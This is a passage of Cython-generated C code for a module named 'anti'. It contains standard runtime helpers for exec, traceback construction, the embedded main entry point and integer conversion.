            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char* code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    }
    else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
            Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject*)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
#if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject*)o, globals, locals);
#else
        result = PyEval_EvalCode(o, globals, locals);
#endif
    }
    else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
#if PY_MAJOR_VERSION >= 3
        }
        else if (!PyBytes_Check(o)) {
#else
        }
        else if (!PyString_Check(o)) {
#endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
#if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
#else
        code = PyString_AS_STRING(o);
#endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        }
        else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState* tstate, int c_line) {
    PyObject* use_cline;
    PyObject* ptype, * pvalue, * ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject** cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    }
    else
#endif
    {
        PyObject* use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
        if (use_cline_obj) {
            use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
            Py_DECREF(use_cline_obj);
        }
        else {
            PyErr_Clear();
            use_cline = NULL;
        }
    }
    if (!use_cline) {
        c_line = 0;
        (void)PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        }
        else if (code_line > entries[mid].code_line) {
            start = mid + 1;
        }
        else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    }
    else {
        return mid + 1;
    }
}
static PyCodeObject* __pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64 * sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i = __pyx_code_cache.count; i > pos; i--) {
        entries[i] = entries[i - 1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
#ifndef Py_BUILD_CORE
#define Py_BUILD_CORE 1
#endif
#include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
    const char* funcname, int c_line,
    int py_line, const char* filename) {
    PyCodeObject* py_code = NULL;
    PyObject* py_funcname = NULL;
#if PY_MAJOR_VERSION < 3
    PyObject* py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
#endif
    if (c_line) {
#if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat("%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
#else
        py_funcname = PyUnicode_FromFormat("%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
#endif
    }
    else {
#if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
#endif
    }
#if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes,
        __pyx_empty_tuple,
        __pyx_empty_tuple,
        __pyx_empty_tuple,
        __pyx_empty_tuple,
        __pyx_empty_tuple,
        py_srcfile,
        py_funcname,
        py_line,
        __pyx_empty_bytes
    );
    Py_DECREF(py_srcfile);
#else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
#endif
    Py_XDECREF(py_funcname);
    return py_code;
bad:
    Py_XDECREF(py_funcname);
#if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
#endif
    return NULL;
}
static void __Pyx_AddTraceback(const char* funcname, int c_line,
    int py_line, const char* filename) {
    PyCodeObject* py_code = 0;
    PyFrameObject* py_frame = 0;
    PyThreadState* tstate = __Pyx_PyThreadState_Current;
    PyObject* ptype, * pvalue, * ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,
        py_code,
        __pyx_d,
        0
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t** argv) {
#else
static int __Pyx_main(int argc, wchar_t** argv) {
#endif
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
        PyObject* m = NULL;
        __pyx_module_is_main_anti = 1;
#if PY_MAJOR_VERSION < 3
        initanti();
#elif CYTHON_PEP489_MULTI_PHASE_INIT
        m = PyInit_anti();
        if (!PyModule_Check(m)) {
            PyModuleDef* mdef = (PyModuleDef*)m;
            PyObject* modname = PyUnicode_FromString("__main__");
            m = NULL;
            if (modname) {
                m = PyModule_NewObject(modname);
                Py_DECREF(modname);
                if (m) PyModule_ExecDef(m, mdef);
            }
        }
#else
        m = PyInit_anti();
#endif
        if (PyErr_Occurred()) {
            PyErr_Print();
#if PY_MAJOR_VERSION < 3
            if (Py_FlushLine()) PyErr_Clear();
#endif
            return 1;
        }
        Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t* res;
#ifdef HAVE_BROKEN_MBSTOWCS
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char* in;
    wchar_t* out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t*)malloc((argsize + 1) * sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize + 1);
        if (count != (size_t)-1) {
            wchar_t* tmp;
            for (tmp = res; *tmp != 0 &&
                (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    argsize = strlen(arg) + 1;
    res = (wchar_t*)malloc(argsize * sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    res = (wchar_t*)malloc((strlen(arg) + 1) * sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while (*in)
        if (*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char** argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t** argv_copy = (wchar_t**)malloc(sizeof(wchar_t*) * argc);
        wchar_t** argv_copy2 = (wchar_t**)malloc(sizeof(wchar_t*) * argc);
        char* oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long)-1, const_zero = (long)0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long)value);
        }
        else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long)value);
#ifdef HAVE_LONG_LONG
        }
        else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    }
    else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long)value);
#ifdef HAVE_LONG_LONG
        }
        else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG)value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char*)&one;
        unsigned char* bytes = (unsigned char*)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
            little, !is_unsigned);
    }
}
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject * x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long)-1, const_zero = (long)0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        }
        else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long)val;
        }
    }
    else
#endif
        if (likely(PyLong_Check(x))) {
            if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
                const digit* digits = ((PyLongObject*)x)->ob_digit;
                switch (Py_SIZE(x)) {
                case  0: return (long)0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long)(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long)(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long)(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
                if (unlikely(Py_SIZE(x) < 0)) {
                    goto raise_neg_overflow;
                }
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (long)-1;
                    if (unlikely(result == 1))
                        goto raise_neg_overflow;
                }
#endif
                if (sizeof(long) <= sizeof(unsigned long)) {
                    __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
                }
                else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                    __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
                }
            }
            else {
#if CYTHON_USE_PYLONG_INTERNALS
                const digit* digits = ((PyLongObject*)x)->ob_digit;
                switch (Py_SIZE(x)) {
                case  0: return (long)0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit)(-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long)(((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long)(((long)-1) * (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long)((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long)(((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long)(((long)-1) * (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long)((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long)(((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long)(((long)-1) * (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long)((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                }
#endif
                if (sizeof(long) <= sizeof(long)) {
                    __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
                }
                else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                    __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
                }
            }
            {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
                PyErr_SetString(PyExc_RuntimeError,
                    "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
                long val;
                PyObject* v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
                if (likely(v) && !PyLong_Check(v)) {
                    PyObject* tmp = v;
                    v = PyNumber_Long(tmp);
                    Py_DECREF(tmp);
                }
#endif
                if (likely(v)) {
                    int one = 1; int is_little = (int)*(unsigned char*)&one;
                    unsigned char* bytes = (unsigned char*)&val;
                    int ret = _PyLong_AsByteArray((PyLongObject*)v,
                        bytes, sizeof(val),
                        is_little, !is_unsigned);
                    Py_DECREF(v);
                    if (likely(!ret))
                        return val;
                }
#endif
                return (long)-1;
            }
        }
        else {
            long val;
            PyObject* tmp = __Pyx_PyNumber_IntOrLong(x);
            if (!tmp) return (long)-1;
            val = __Pyx_PyInt_As_long(tmp);
            Py_DECREF(tmp);
            return val;
        }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long)-1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long)-1;
}
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject * x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int)-1, const_zero = (int)0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        }
        else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int)val;
        }
    }
    else
#endif
        if (likely(PyLong_Check(x))) {
            if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
                const digit* digits = ((PyLongObject*)x)->ob_digit;
                switch (Py_SIZE(x)) {
                case  0: return (int)0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int)(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int)(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int)(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
                if (unlikely(Py_SIZE(x) < 0)) {
                    goto raise_neg_overflow;
                }
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (int)-1;
                    if (unlikely(result == 1))
                        goto raise_neg_overflow;
                }
#endif
                if (sizeof(int) <= sizeof(unsigned long)) {
                    __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
                }
                else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                    __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
                }
            }
            else {
#if CYTHON_USE_PYLONG_INTERNALS
                const digit* digits = ((PyLongObject*)x)->ob_digit;
                switch (Py_SIZE(x)) {
                case  0: return (int)0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit)(-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, +digits[0])
                case -2:
